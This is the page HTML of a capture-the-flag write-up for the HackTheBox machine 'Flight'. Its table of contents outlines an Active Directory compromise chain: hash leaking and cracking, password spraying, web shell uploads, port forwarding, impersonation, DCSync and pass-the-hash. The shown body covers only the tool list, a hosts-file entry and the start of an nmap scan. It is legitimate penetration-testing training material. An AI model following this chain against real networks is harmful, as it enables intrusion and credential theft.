    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#add-target-to-etchosts" class="md-nav__link">
    <span class="md-ellipsis">
      Add target to /etc/hosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RPC enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-logon" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#anonymous-logon_1" class="md-nav__link">
    <span class="md-ellipsis">
      Anonymous logon
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-app-inspection" class="md-nav__link">
    <span class="md-ellipsis">
      Web app inspection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web app inspection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#banner-grabbing" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-app-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Web app enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web app enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Domain enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomain enumeration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#virtual-host-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual host enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Virtual host enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-is-virtual-host" class="md-nav__link">
    <span class="md-ellipsis">
      What is virtual host?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#subdomains-vs-vhosts" class="md-nav__link">
    <span class="md-ellipsis">
      Subdomains vs VHosts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing_1" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-the-webapp" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting the WebApp
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting the WebApp">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-for-lfi" class="md-nav__link">
    <span class="md-ellipsis">
      Checking for LFI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-for-rfi" class="md-nav__link">
    <span class="md-ellipsis">
      Checking for RFI
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-svc_apache-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with svc_apache creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-valid-users" class="md-nav__link">
    <span class="md-ellipsis">
      Finding valid users
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Password spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-smoon-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with S.Moon creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-smoon" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as S.Moon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#leaking-another-users-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Leaking another user’s NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash_1" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-where-we-can-login-with-cbum-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Checking where we can login with c.bum creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as C.Bum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-web-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading web shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as svc_apache
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shell as svc_apache">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-privileges-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      User privileges (svc_apache)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-membership-of-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      Group membership of C.Bum
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impersonate-cbum-as-svc_apache" class="md-nav__link">
    <span class="md-ellipsis">
      Impersonate C.Bum as svc_apache
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1-what-runas-does" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 1. What runas does
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-what-impersonation-means-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 2. What “impersonation” means in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-process-level-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      🔹 3. Process-level impersonation?
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-cbum" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as C.Bum
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#investigating-the-filesystem" class="md-nav__link">
    <span class="md-ellipsis">
      Investigating the filesystem
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-winpeas" class="md-nav__link">
    <span class="md-ellipsis">
      Using winpeas
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Using winpeas">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#listening-ports" class="md-nav__link">
    <span class="md-ellipsis">
      Listening ports
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pid-4-in-windows" class="md-nav__link">
    <span class="md-ellipsis">
      PID 4 in Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#correlating-listening-ports-with-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating listening ports with the IIS server
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Port forwarding
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Port forwarding">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-chisel" class="md-nav__link">
    <span class="md-ellipsis">
      Using chisel
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#banner-grabbing_2" class="md-nav__link">
    <span class="md-ellipsis">
      Banner grabbing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#understanding-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding the IIS server
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Understanding the IIS server">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#webpage-content-directory" class="md-nav__link">
    <span class="md-ellipsis">
      Webpage content directory
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-webshell-on-the-iis-server" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading webshell on the IIS server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shell-as-iis-apppool" class="md-nav__link">
    <span class="md-ellipsis">
      Shell as IIS APPPOOL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shell as IIS APPPOOL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-is-user-iis-apppooldefaultapppool" class="md-nav__link">
    <span class="md-ellipsis">
      What is user iis apppool\defaultapppool ?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-vectors-via-apppool-identity" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Vectors via AppPool Identity
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-users-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Check user’s privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-is-the-privilege-seimpersonate" class="md-nav__link">
    <span class="md-ellipsis">
      What is the privilege SeImpersonate ?
    </span>
  </a>
  
    <nav class="md-nav" aria-label="What is the privilege SeImpersonate ?">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#so-in-our-case" class="md-nav__link">
    <span class="md-ellipsis">
      So in our case:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-impersonating-the-machine-account-locally-means" class="md-nav__link">
    <span class="md-ellipsis">
      What impersonating the MACHINE$ account locally means
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-this-works-without-the-machine-account-password" class="md-nav__link">
    <span class="md-ellipsis">
      Why this works without the machine account password
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-not-impersonate-administrator-directly" class="md-nav__link">
    <span class="md-ellipsis">
      Why not impersonate Administrator directly?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1-seimpersonateprivilege-vs-actual-tokens" class="md-nav__link">
    <span class="md-ellipsis">
      1️⃣ SeImpersonatePrivilege vs. actual tokens
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-why-machine-works" class="md-nav__link">
    <span class="md-ellipsis">
      2️⃣ Why MACHINE$ works
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-why-administrator-is-harder" class="md-nav__link">
    <span class="md-ellipsis">
      3️⃣ Why Administrator is harder
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-practical-implications" class="md-nav__link">
    <span class="md-ellipsis">
      4️⃣ Practical implications
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grabbing-machine-accounts-ticket-with-rubeus" class="md-nav__link">
    <span class="md-ellipsis">
      Grabbing machine account’s ticket with Rubeus
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Grabbing machine account’s ticket with Rubeus">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#what-are-machine-accounts-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      What are Machine accounts ($ accounts)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      DCSync
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-administrator-via-pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as Administrator via pass the hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="image.png" src="../MediaFiles/flight_image.png" /></p>
<p>[[windows]] [[NotAssumedBreach]] [[webapp]] [[PortForwarding]] [[Impersonation]] [[DCSync]] [[WinPEAS]] [[Vhosts]] [[OSCPpath]]<br />
Tags: #windows #NotAssumedBreach #WebApp #PortForwarding #Impersonation #DCSync #WinPEAS #Vhosts</p>
<p>Tools used:</p>
<ul>
<li>whatweb (banner grabbing)</li>
<li>gobuster (domain and subdomain enumeration)</li>
<li>smbclient (SMB enumeration)</li>
<li>chisel (port forwarding)</li>
<li>winpeas (windows privesc)</li>
<li>Runas (User impersonation)</li>
<li>Rubeus</li>
<li>secretsdump (DCSync)</li>
</ul>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<h2 id="add-target-to-etchosts">Add target to /etc/hosts</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;10.129.148.8 flight.htb&#39; &gt;&gt; /etc/hosts&quot;</span>
</span></code></pre></div>
<h2 id="nmap-scan">Nmap scan</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>flight.htb
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>&lt;https://nmap.org&gt;<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-08-20<span class="w"> </span><span class="m">11</span>:47<span class="w"> </span>CDT
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>flight.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.148.8<span class="o">)</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.0081s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">988</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.52<span class="w"> </span><span class="o">((</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/1.1.1m<span class="w"> </span>PHP/8.1.1<span class="o">)</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Win64<span class="o">)</span><span class="w"> </span>OpenSSL/1.1.1m<span class="w"> </span>PHP/8.1.1
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="p">|</span><span class="w"> </span>http-methods:
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">|</span>_http-title:<span class="w"> </span>g0<span class="w"> </span>Aviation
